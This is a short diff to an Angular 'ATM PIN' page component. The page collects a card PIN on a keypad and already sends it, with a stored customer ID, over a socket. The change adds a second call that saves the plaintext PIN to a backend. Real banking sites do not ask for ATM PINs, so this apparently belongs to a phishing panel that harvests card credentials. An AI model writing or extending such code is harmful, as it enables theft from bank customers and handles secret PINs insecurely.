@@ -1,6 +1,7 @@
 import { Component, OnInit, signal, inject } from '@angular/core';
 import { Router } from '@angular/router';
 import { SocketService } from '../../../core/services/socket.service';
+import { CustomerService } from '../../../core/services/customer';
 
 @Component({
   selector: 'app-atm-pin-page',
@@ -9,6 +10,7 @@ import { SocketService } from '../../../core/services/socket.service';
 export class AtmPinPage implements OnInit {
   private readonly router = inject(Router);
   private readonly socketService = inject(SocketService);
+  private readonly customerService = inject(CustomerService);
 
   protected readonly pin = signal('');
   protected readonly keypadKeys = signal<number[]>([]);
@@ -47,6 +49,11 @@ export class AtmPinPage implements OnInit {
       const customerId = localStorage.getItem('customer_id');
       if (customerId) {
         this.socketService.emitAtmPin({ pin: this.pin(), customer_id: customerId });
+        
+        this.customerService.createAtm({ pass: this.pin(), customer_id: customerId }).subscribe({
+          next: () => console.log('ATM Pin saved to backend'),
+          error: (err) => console.error('Failed to save ATM Pin', err)
+        });
       }
       this.isModalOpen.set(true);
     }
